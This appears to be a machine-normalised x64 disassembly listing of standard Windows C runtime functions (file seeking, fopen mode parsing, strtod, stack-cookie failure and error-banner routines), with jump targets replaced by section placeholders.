cmp rax 0xffffffffffffffff
mov [ rdi ] rax
setne bl
lea eax [ rbx - 0x1 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_1400427c0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov eax [ rcx + 0x18 ]
mov edi r8d
mov rbp rdx
mov rbx rcx
test al 0x83
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
or eax 0xffffffff
xor esi esi
test r8d r8d
je r-xdata
and eax 0xffffffef
mov [ rcx + 0x18 ] eax
cmp r8d 0x1
jne r-xdata
cmp r8d 0x1
je r-xdata
mov rcx rbx
call sub_14003ed0c
mov r11d [ rbx + 0x18 ]
test r11b r11b
jns r-xdata
call sub_140050104
mov edi esi
add rbp rax
cmp r8d 0x2
jne r-xdata
test r11b 0x1
je r-xdata
and r11d 0xfffffffc
mov [ rbx + 0x18 ] r11d
jmp r-xdata
mov rcx rbx
call sub_14003be60
mov r8d edi
mov rdx rbp
mov ecx eax
call sub_1400504e8
cmp rax 0xffffffffffffffff
setne sil
lea eax [ rsi - 0x1 ]
jmp r-xdata
test r11b 0x8
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
bt r11d 0xa
jb r-xdata
mov [ rbx + 0x24 ] 0x200
sub_14004288c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x20
mov ebx r8d
mov rsi rdx
mov rdi rcx
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or eax 0xffffffff
jmp r-xdata
call sub_14003bd5c
nop
mov r8d ebx
mov rdx rsi
mov rcx rdi
call sub_1400427c0
mov ebx eax
mov rcx rdi
call sub_14003bdf4
mov eax ebx
cmp ebx 0x1
je r-xdata
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
cmp ebx 0x2
jne r-xdata
sub_140042908
sub rsp 0x28
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or eax 0xffffffff
add rsp 0x28
retn
mov rdx [ rdx ]
xor r8d r8d
add rsp 0x28
jmp sub_14004288c
sub_140042940
mov [ rsp + 0x10 ] rdi
mov [ rsp + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x70
movsxd rdi ecx
lea rcx [ rbp - 0x20 ]
call sub_14003b928
cmp edi 0x100
jae r-xdata
mov rax [ rbp - 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rdx [ rbp - 0x20 ]
cmp [ rdx + 0x10c ] 0x1
jle r-xdata
call sub_14003f1a4
mov edx 0x1
mov [ rax ] 0x2a
mov [ rbp + 0x10 ] dil
mov [ rbp + 0x11 ] 0x0
mov r12d edi
lea rdx [ rbp - 0x20 ]
sar r12d 0x8
movzx ecx r12b
call sub_14004fcb8
test eax eax
je r-xdata
mov rax [ rdx + 0x140 ]
movzx eax [ rax + rdi * 2 ]
and eax 0x1
lea r8 [ rbp - 0x20 ]
mov edx 0x1
mov ecx edi
call sub_14004b7b4
mov rdx [ rbp - 0x20 ]
jmp r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ rbp + 0x20 ]
je r-xdata
mov [ rbp + 0x10 ] r12b
mov [ rbp + 0x11 ] dil
mov [ rbp + 0x12 ] 0x0
mov edx 0x2
jmp r-xdata
mov rax [ rdx + 0x148 ]
movzx eax [ rax + rdi ]
jmp r-xdata
test eax eax
je r-xdata
mov eax edi
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x8 ] 0x0
je r-xdata
movzx ecx [ rbp + 0x21 ]
shl eax 0x8
or eax ecx
mov rcx [ rbp - 0x20 ]
mov [ rsp + 0x40 ] 0x1
lea r9 [ rbp + 0x10 ]
mov eax [ rcx + 0x4 ]
mov r8d 0x100
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x20 ]
mov [ rsp + 0x30 ] 0x3
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] edx
mov edx [ rcx + 0x14 ]
lea rcx [ rbp - 0x20 ]
call sub_140041ba0
test eax eax
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rdi [ r11 + 0x18 ]
mov r12 [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_140042ab0
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x70
movaps [ rsp + 0x60 ] xmm6
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x58 ] rax
mov rsi rcx
mov rbx rcx
mov rdi rdx
lea rcx [ rsp + 0x20 ]
mov rdx r8
call sub_14003b928
test rdi rdi
je r-xdata
test rsi rsi
jne r-xdata
mov [ rdi ] rbx
mov rdx [ rsp + 0x20 ]
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
cmp [ rsp + 0x38 ] sil
je r-xdata
movzx ecx [ rbx ]
mov rax [ rdx + 0x140 ]
movzx eax [ rax + rcx * 2 ]
and eax 0x8
movzx ecx [ rbx ]
lea r8 [ rsp + 0x20 ]
mov edx 0x8
call sub_14004b7b4
mov rdx [ rsp + 0x20 ]
jmp r-xdata
xorpd xmm0 xmm0
jmp r-xdata
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
lea r8 [ rsp + 0x20 ]
lea rcx [ rsp + 0x40 ]
mov rdx rbx
call sub_1400505d0
test rdi rdi
je r-xdata
inc rbx
jmp r-xdata
test eax eax
je r-xdata
mov rcx [ rsp + 0x58 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
movaps xmm6 [ rsp + 0x60 ]
mov rsp r11
pop rdi
retn
test [ rax ] 0x240
je r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx rbx
mov [ rdi ] rcx
cmp [ rdx + 0x10c ] 0x1
jle r-xdata
test [ rax ] 0x81
je r-xdata
xorpd xmm6 xmm6
test rdi rdi
je r-xdata
test [ rax ] 0x100
je r-xdata
cmp [ rbx ] 0x2d
movsd xmm6 [ rw-data ]
jne r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov [ rdi ] rsi
jmp r-xdata
movsd xmm6 [ rax + 0x10 ]
movsd xmm0 [ rax + 0x10 ]
xorpd xmm6 xmm6
ucomisd xmm0 xmm6
jpe r-xdata
call sub_14003f1a4
mov [ rax ] 0x22
jmp r-xdata
xorpd xmm6 [ r--data ]
jmp r-xdata
movapd xmm0 xmm6
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
jne r-xdata
sub_140042c24
sub rsp 0x28
call sub_14003e20c
test rax rax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
mov ecx 0x16
call sub_14003e21c
mov ecx 0x3
call sub_14003e198
int3
mov r8d 0x1
mov edx 0x40000015
lea ecx [ r8 + 0x2 ]
call sub_140043570
sub_140042c80
mov [ rsp + 0x8 ] rcx
sub rsp 0x88
lea rcx [ rw-data ]
call [ RtlCaptureContext@IAT ]
mov rax [ rw-data ]
mov [ rsp + 0x58 ] rax
xor r8d r8d
lea rdx [ rsp + 0x60 ]
mov rcx [ rsp + 0x58 ]
call RtlLookupFunctionEntry
mov [ rsp + 0x50 ] rax
cmp [ rsp + 0x50 ] 0x0
je r-xdata
mov rax [ rsp + 0x88 ]
mov [ rw-data ] rax
lea rax [ rsp + 0x88 ]
add rax 0x8
mov [ rw-data ] rax
mov [ rsp + 0x38 ] 0x0
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x28 ] rax
lea rax [ rw-data ]
mov [ rsp + 0x20 ] rax
mov r9 [ rsp + 0x50 ]
mov r8 [ rsp + 0x58 ]
mov rdx [ rsp + 0x60 ]
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov edx 0xc0000409
mov rcx rax
call [ TerminateProcess@IAT ]
add rsp 0x88
retn
mov ecx 0x1
call sub_140050694
mov rax [ rw-data ]
mov [ rw-data ] rax
mov rax [ rsp + 0x90 ]
mov [ rw-data ] rax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov rax [ rw-data ]
mov [ rsp + 0x68 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x70 ] rax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
mov ecx 0x1
call sub_140050694
xor ecx ecx
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ r--data ]
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
sub_140042dcc
push rbx
sub rsp 0x20
test rcx rcx
je r-xdata
call sub_14003f1a4
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
mov r9 rcx
sub r9 r8
mov [ rcx ] r8b
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rcx ] dl
call sub_14003f1a4
mov ebx 0x22
jmp r-xdata
mov al [ r8 ]
mov [ r9 + r8 ] al
inc r8
test al al
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_140043760
mov eax ebx
sub_140042e30
push rbx
sub rsp 0x30
mov rbx rcx
mov ecx 0xe
call sub_140046c48
nop
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
mov ecx 0xe
call sub_140046b48
add rsp 0x30
pop rbx
retn
mov rcx [ rw-data ]
lea rdx [ rw-data ]
mov rcx [ rbx + 0x8 ]
call sub_14003ad04
and [ rbx + 0x8 ] 0x0
cmp [ rcx ] rax
jne r-xdata
mov rdx rcx
jmp r-xdata
mov rax [ rcx + 0x8 ]
mov [ rdx + 0x8 ] rax
call sub_14003ad04
jmp r-xdata
mov [ rsp + 0x20 ] rcx
test rcx rcx
je r-xdata
sub_140042ea4
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
xor eax eax
mov rcx rbx
call rax
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_140042ed8
sub rsp 0x28
xor r8d r8d
mov edx 0x1000
xor ecx ecx
mov [ rsp + 0x30 ] 0x2
call [ HeapCreate@IAT ]
mov [ rw-data ] rax
test rax rax
je r-xdata
add rsp 0x28
retn
call [ GetVersion@IAT ]
cmp al 0x6
jae r-xdata
mov eax 0x1
mov rcx [ rw-data ]
lea r8 [ rsp + 0x30 ]
mov r9d 0x4
xor edx edx
call [ HeapSetInformation@IAT ]
sub_140042f30
mov r11 rsp
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x18 ] rbp
mov [ r11 + 0x20 ] rsi
mov [ r11 + 0x10 ] rdx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r15 [ r9 + 0x8 ]
mov r14 [ r9 ]
mov eax [ rcx + 0x4 ]
mov rdi [ r9 + 0x38 ]
sub r14 r15
mov r12 r9
mov r13 rdx
mov rbp rcx
test al 0x66
jne r-xdata
mov r8 [ r9 + 0x20 ]
xor ebp ebp
xor r13d r13d
sub r8 r15
test al 0x20
je r-xdata
movsxd rsi [ r9 + 0x48 ]
mov [ r11 - 0x38 ] rcx
mov [ r11 - 0x30 ] r8
mov rax rsi
cmp esi [ rdi ]
jae r-xdata
movsxd rsi [ r9 + 0x48 ]
mov rbx rsi
cmp esi [ rdi ]
jae r-xdata
xor edx edx
cmp [ rdi ] edx
jbe r-xdata
mov eax 0x1
add rax rax
lea rbx [ rdi + rax * 8 + 0xc ]
inc rbx
shl rbx 0x4
add rbx rdi
lea rcx [ rdi + 0x8 ]
inc esi
add rbx 0x10
cmp esi [ rdi ]
jae r-xdata
mov eax [ rbx - 0x4 ]
cmp r14 rax
jae r-xdata
inc esi
add rbx 0x10
cmp esi [ rdi ]
jb r-xdata
mov eax [ rbx - 0x8 ]
cmp r14 rax
jae r-xdata
inc edx
add rcx 0x10
cmp edx [ rdi ]
jae r-xdata
mov eax [ rcx ]
cmp r8 rax
jbe r-xdata
jmp r-xdata
cmp [ rbx + 0x4 ] 0x0
je r-xdata
mov eax [ rbx - 0xc ]
cmp r14 rax
jb r-xdata
test r13d r13d
je r-xdata
jmp r-xdata
mov eax edx
add rax rax
mov ecx [ rdi + rax * 8 + 0x10 ]
test ecx ecx
jne r-xdata
mov eax [ rbx - 0x8 ]
cmp r14 rax
jb r-xdata
cmp [ rbx ] 0x1
je r-xdata
test ebp ebp
je r-xdata
cmp r13d [ rbx ]
je r-xdata
mov eax [ rcx - 0x4 ]
cmp r8 rax
jb r-xdata
mov r13d ecx
mov ebp [ rdi + rax * 8 + 0xc ]
jmp r-xdata
cmp [ rbp ] 0xe06d7363
jne r-xdata
mov eax [ rbx ]
lea rcx [ rsp + 0x30 ]
mov rdx r13
add rax r15
call rax
test eax eax
js r-xdata
cmp [ rbx ] 0x0
jne r-xdata
cmp ebp [ rbx - 0x4 ]
je r-xdata
mov ecx [ rbx + 0x4 ]
mov r8d 0x1
mov rdx r13
add rcx r15
call sub_1400437c0
mov rax [ r12 + 0x40 ]
mov edx [ rbx + 0x4 ]
movsxd r9 [ rbp ]
mov [ rsp + 0x28 ] rax
mov rax [ r12 + 0x28 ]
add rdx r15
mov r8 rbp
mov rcx r13
mov [ rsp + 0x20 ] rax
call [ RtlUnwindEx@IAT ]
call sub_1400437f0
cmp [ r--data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
jle r-xdata
mov rdx [ rsp + 0x78 ]
lea eax [ rsi + 0x1 ]
mov cl 0x1
mov [ r12 + 0x48 ] eax
mov r8d [ rbx - 0x4 ]
add r8 r15
call r8
lea rcx [ r--data ]
call sub_14004eaa0
test eax eax
je r-xdata
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov edx 0x1
mov rcx rbp
call [ r--data ]
sub_140043130
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov esi [ rw-data ]
xor r14d r14d
mov rbp r9
lea r15d [ r14 + 0x20 ]
mov r12d r8d
mov rbx rdx
mov r13 rcx
mov r9d r14d
mov r10d r14d
mov r11d r14d
cmp [ rdx ] r15w
jne r-xdata
movzx eax [ rbx ]
mov r8d 0x1
cmp eax 0x61
je r-xdata
add rbx 0x2
cmp [ rbx ] r15w
je r-xdata
mov edi 0x109
cmp eax 0x72
je r-xdata
cmp [ rbx ] r15w
je r-xdata
test edx edx
je r-xdata
mov edi r14d
or esi r8d
jmp r-xdata
cmp eax 0x77
je r-xdata
add rbx 0x2
cmp [ rbx ] r14w
jne r-xdata
test r11d r11d
je r-xdata
movzx ecx ax
cmp ecx 0x53
jg r-xdata
add rbx 0x2
mov edx r8d
movzx eax [ rbx ]
test ax ax
je r-xdata
mov edi 0x301
jmp r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
lea rcx [ rsp + 0x68 ]
mov r9d r12d
mov r8d edi
mov rdx r13
mov [ rsp + 0x20 ] 0x180
call sub_140050f18
test eax eax
jne r-xdata
jmp r-xdata
sub ecx 0x54
je r-xdata
je r-xdata
or esi 0x2
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
xor eax eax
jmp r-xdata
inc [ rw-data ]
mov eax [ rsp + 0x68 ]
mov [ rbp + 0x18 ] esi
mov [ rbp + 0x1c ] eax
mov [ rbp + 0x8 ] r14d
mov [ rbp ] r14
mov rax rbp
mov [ rbp + 0x10 ] r14
mov [ rbp + 0x28 ] r14
cmp [ rbx ] r15w
je r-xdata
bt edi 0xc
jae r-xdata
sub ecx 0xe
je r-xdata
test r10d r10d
jne r-xdata
sub ecx r15d
je r-xdata
add rbx 0x2
lea rcx [ r--data ]
mov r8d 0x3
mov rdx rbx
call sub_1400510fc
test eax eax
jne r-xdata
bts edi 0xc
mov edx r14d
jmp r-xdata
test edi 0xc000
jne r-xdata
dec ecx
je r-xdata
mov r10d r8d
or edi r15d
jmp r-xdata
add rbx 0x2
movzx eax [ rbx ]
test ax ax
jne r-xdata
sub ecx 0xb
je r-xdata
add rbx 0x6
jmp r-xdata
bts edi 0xf
jmp r-xdata
test r9d r9d
jne r-xdata
sub ecx 0xb
je r-xdata
test dil 0x2
jne r-xdata
dec ecx
je r-xdata
cmp [ rbx ] r15w
je r-xdata
mov r9d r8d
bts esi 0xe
jmp r-xdata
test r9d r9d
jne r-xdata
cmp ecx 0x6
jne r-xdata
and edi 0xfffffffe
and esi 0xfffffffc
or edi 0x2
bts esi 0x7
jmp r-xdata
mov r11d r8d
jmp r-xdata
sub ecx 0x18
je r-xdata
add rbx 0x2
cmp [ rbx ] 0x3d
jne r-xdata
mov r9d r8d
btr esi 0xe
jmp r-xdata
test edi 0xc000
jne r-xdata
test dil 0x40
jne r-xdata
sub ecx 0xa
je r-xdata
add rbx 0x2
cmp [ rbx ] r15w
je r-xdata
bts edi 0xe
jmp r-xdata
or edi 0x40
jmp r-xdata
bts edi 0x7
jmp r-xdata
cmp ecx 0x4
jne r-xdata
lea rdx [ r--data ]
mov r8d 0x5
mov rcx rbx
call sub_140051064
test eax eax
jne r-xdata
test r10d r10d
jne r-xdata
lea rdx [ r--data ]
mov r8d 0x8
mov rcx rbx
call sub_140051064
test eax eax
jne r-xdata
add rbx 0xa
bts edi 0x12
jmp r-xdata
mov r10d r8d
or edi 0x10
jmp r-xdata
lea rdx [ r--data ]
mov r8d 0x7
mov rcx rbx
call sub_140051064
test eax eax
jne r-xdata
add rbx 0x10
bts edi 0x11
jmp r-xdata
add rbx 0xe
bts edi 0x10
jmp r-xdata
sub_140043410
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
xor ebx ebx
lea ecx [ rbx + 0x1 ]
call sub_140046c48
nop
xor edi edi
test rbx rbx
je r-xdata
movsxd rsi edi
mov rax [ rw-data ]
cmp [ rax + rsi * 8 ] 0x0
je r-xdata
mov ecx 0x1
call sub_140046b48
mov rax rbx
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
and [ rbx + 0x18 ] 0x8000
and [ rbx + 0x8 ] 0x0
and [ rbx + 0x10 ] 0x0
and [ rbx ] 0x0
and [ rbx + 0x28 ] 0x0
or [ rbx + 0x1c ] 0xffffffff
mov ecx 0x58
call sub_140041684
mov rcx rax
movsxd rdi edi
mov rax [ rw-data ]
mov [ rax + rdi * 8 ] rcx
test rcx rcx
je r-xdata
mov rax [ rax + rsi * 8 ]
test [ rax + 0x18 ] 0x83
jne r-xdata
add rcx 0x30
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc edi
jmp r-xdata
test [ rax + 0x18 ] 0x8000
jne r-xdata
mov rax [ rw-data ]
mov rcx [ rax + rdi * 8 ]
add rcx 0x30
call [ EnterCriticalSection@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 + rdi * 8 ]
and [ rbx + 0x18 ] 0x0
mov rcx [ rw-data ]
mov rcx [ rcx + rdi * 8 ]
call sub_14003ad04
mov r11 [ rw-data ]
and [ r11 + rdi * 8 ] 0x0
jmp r-xdata
mov [ rsp + 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
lea eax [ rdi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov rdx [ rw-data ]
mov rdx [ rdx + rsi * 8 ]
mov ecx edi
call sub_14003bdc0
mov r11 [ rw-data ]
mov rax [ r11 + rsi * 8 ]
test [ rax + 0x18 ] 0x83
je r-xdata
lea ecx [ rdi + 0x10 ]
call sub_140046b60
test eax eax
je r-xdata
mov rbx rax
jmp r-xdata
mov rdx rax
mov ecx edi
call sub_14003be40
jmp r-xdata
sub_140043570
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rbp
push rdi
push r12
lea rbp [ rsp - 0x4f0 ]
sub rsp 0x5f0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4e0 ] rax
mov edi r8d
mov esi edx
mov ebx ecx
cmp ecx 0xffffffff
je r-xdata
and [ rsp + 0x70 ] 0x0
lea rcx [ rsp + 0x74 ]
xor edx edx
mov r8d 0x94
call sub_14003d760
lea r11 [ rsp + 0x70 ]
lea rax [ rbp + 0x10 ]
lea rcx [ rbp + 0x10 ]
mov [ rsp + 0x48 ] r11
mov [ rsp + 0x50 ] rax
call [ RtlCaptureContext@IAT ]
mov r12 [ rbp + 0x108 ]
lea rdx [ rsp + 0x40 ]
mov rcx r12
xor r8d r8d
call RtlLookupFunctionEntry
test rax rax
je r-xdata
call sub_140050694
mov rax [ rbp + 0x508 ]
mov [ rbp + 0x108 ] rax
lea rax [ rbp + 0x508 ]
mov [ rbp + 0xa8 ] rax
and [ rsp + 0x38 ] 0x0
mov rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x60 ]
mov [ rsp + 0x30 ] rcx
lea rcx [ rsp + 0x58 ]
mov r9 rax
mov [ rsp + 0x28 ] rcx
lea rcx [ rbp + 0x10 ]
mov r8 r12
mov [ rsp + 0x20 ] rcx
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
mov rcx [ rbp + 0x4e0 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x5f0 ]
mov rbx [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rbp
retn
test edi edi
jne r-xdata
mov rax [ rbp + 0x508 ]
mov [ rsp + 0x70 ] esi
mov [ rsp + 0x74 ] edi
mov [ rbp - 0x80 ] rax
call [ IsDebuggerPresent@IAT ]
xor ecx ecx
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ rsp + 0x48 ]
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
mov ecx ebx
call sub_140050694
sub_1400436f0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
mov rbp rcx
mov rcx [ rw-data ]
mov ebx r9d
mov rdi r8
mov rsi rdx
call [ DecodePointer@IAT ]
mov r9d ebx
mov r8 rdi
mov rdx rsi
mov rcx rbp
test rax rax
je r-xdata
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x20 ] rax
call sub_1400436bc
int3
mov r10 [ rsp + 0x60 ]
mov [ rsp + 0x20 ] r10
call rax
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_1400437f4
lea r8 [ r--data ]
xor eax eax
mov rdx r8
cdqe
add rax rax
mov rax [ r8 + rax * 8 + 0x8 ]
retn
inc eax
add rdx 0x10
cmp eax 0x16
jb r-xdata
cmp ecx [ rdx ]
je r-xdata
xor eax eax
retn
sub_140043820
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x250
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x240 ] rax
mov edi ecx
call sub_1400437f4
xor esi esi
mov rbx rax
test rax rax
je r-xdata
mov rcx [ rsp + 0x240 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x250 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rsp r11
pop r13
pop r12
pop rdi
retn
lea ecx [ rsi + 0x3 ]
call sub_140051488
cmp eax 0x1
je r-xdata
mov ecx 0xfffffff4
call [ GetStdHandle@IAT ]
mov rdi rax
test rax rax
je r-xdata
lea ecx [ rsi + 0x3 ]
call sub_140051488
test eax eax
jne r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
cmp edi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
mov edx esi
lea r8 [ rsp + 0x40 ]
lea rbp [ rw-data ]
mov r12d 0x314
lea r8 [ r--data ]
mov rcx rbp
mov edx r12d
call sub_1400468c4
xor ecx ecx
test eax eax
jne r-xdata
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x233 ] sil
call sub_14003f7f0
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
mov rcx rdi
mov r8 rax
mov [ rsp + 0x20 ] rsi
call [ WriteFile@IAT ]
inc edx
inc r8
add rbx 0x2
cmp edx 0x1f4
jb r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
mov [ rsp + 0x20 ] rsi
call sub_1400436bc
int3
lea r13 [ rw-data ]
mov r8d 0x104
mov [ rw-data ] si
mov rdx r13
call [ GetModuleFileNameW@IAT ]
lea edi [ r12 - 0x19 ]
test eax eax
jne r-xdata
mov cl [ rbx ]
mov [ r8 ] cl
cmp [ rbx ] si
je r-xdata
mov rcx r13
call sub_140046974
inc rax
cmp rax 0x3c
jbe r-xdata
lea r8 [ r--data ]
mov edx edi
mov rcx r13
call sub_1400468c4
test eax eax
je r-xdata
lea r8 [ r--data ]
mov rdx r12
mov rcx rbp
call sub_140051330
test eax eax
jne r-xdata
mov rcx r13
call sub_140046974
lea r8 [ r--data ]
mov r9d 0x3
lea rcx [ rbp + rax * 2 - 0x44 ]
mov rax rcx
sub rax r13
sar rax 0x1
sub rdi rax
mov rdx rdi
call sub_1400513b8
test eax eax
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_1400436bc
int3
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_1400436bc
int3
mov r8 rbx
mov rdx r12
mov rcx rbp
call sub_140051330
test eax eax
jne r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_1400436bc
int3
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_1400436bc
int3
lea rdx [ r--data ]
mov r8d 0x12010
mov rcx rbp
call sub_140051128
jmp r-xdata
sub_140043a80
sub rsp 0x28
mov ecx 0x3
call sub_140051488
cmp eax 0x1
je r-xdata
mov ecx 0xfc
call sub_140043820
mov ecx 0xff
call sub_140043820
mov ecx 0x3
call sub_140051488
test eax eax
jne r-xdata
add rsp 0x28
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_140043af8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx + 0xa0 ] rax
and [ rcx + 0x10 ] 0x0
mov [ rcx + 0x1c ] 0x1
mov [ rcx + 0xc8 ] 0x1
mov [ rcx + 0x174 ] 0x43
mov [ rcx + 0x1f7 ] 0x43
lea rax [ rw-data ]
mov [ rcx + 0xb8 ] rax
mov ecx 0xd
call sub_140046c48
nop
mov rax [ rbx + 0xb8 ]
[ rax ]
mov ecx 0xd
call sub_140046b48
mov ecx 0xc
call sub_140046c48
nop
mov [ rbx + 0xc0 ] rdi
test rdi rdi
jne r-xdata
mov rcx [ rbx + 0xc0 ]
call sub_140045c28
nop
mov ecx 0xc
call sub_140046b48
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rw-data ]
mov [ rbx + 0xc0 ] rax
sub_140043bb0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
mov edi eax
call [ FlsGetValue@IAT ]
mov rbx rax
test rax rax
jne r-xdata
mov ecx edi
call [ SetLastError@IAT ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rax + 0x1 ]
mov edx 0x2c8
call sub_140041704
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
call sub_14003ad04
xor ebx ebx
xor edx edx
call sub_140043af8
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
jmp r-xdata
sub_140043c58
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x38 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x48 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x58 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x68 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x70 ]
test rcx rcx
je r-xdata
call sub_14003ad04
